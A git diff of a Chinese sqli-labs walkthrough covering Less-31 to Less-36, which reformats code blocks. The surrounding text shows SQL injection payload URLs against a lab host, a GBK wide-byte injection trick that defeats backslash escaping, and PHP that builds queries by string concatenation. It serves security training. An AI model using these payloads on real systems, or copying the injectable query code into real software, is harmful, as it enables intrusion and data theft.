@@ -150,9 +150,11 @@ http://202.206.96.155:8081/sqli-labs/Less-31/?id=100&#8243;) union select 1,2,3 
 
 ### 第三十二题
 看源码可知 将单引号与双引号过滤了以及\ 过滤方法是加入\\
-````$string = preg_replace(‘/’. preg_quote(‘\\’) .’/’, “\\\\\\”, $string); //escape any backslash
+```
+$string = preg_replace(‘/’. preg_quote(‘\\’) .’/’, “\\\\\\”, $string); //escape any backslash
 $string = preg_replace(‘/\’/i’, ‘\\\”, $string); //escape single quote with a backslash
-$string = preg_replace(‘/\”/’, “\\\””, $string); //escape double quote with a backslash````
+$string = preg_replace(‘/\”/’, “\\\””, $string); //escape double quote with a backslash
+```
 
 这里有一个很好的知识点：GBK的宽字节注入：%df 与 %5c 连在一起组合成 運 单引号依然在，成功闭合 用%a1也可以
 paylload为：http://202.206.96.155:8081/sqli-labs/Less-32/?id=-3%df’ union select 1,2,3 –+
@@ -180,9 +182,11 @@ fclose($fp);
 mysql_query(“SET NAMES gbk”);——————————–>>
 ```
 这里应该是自己把\\给编码走了
-````$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1″;
+```
+$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1″;
 $result=mysql_query($sql);
-$row = mysql_fetch_array($result);````
+$row = mysql_fetch_array($result);
+```
 
 ### 第三十六题
 mysql_real_escape_string()
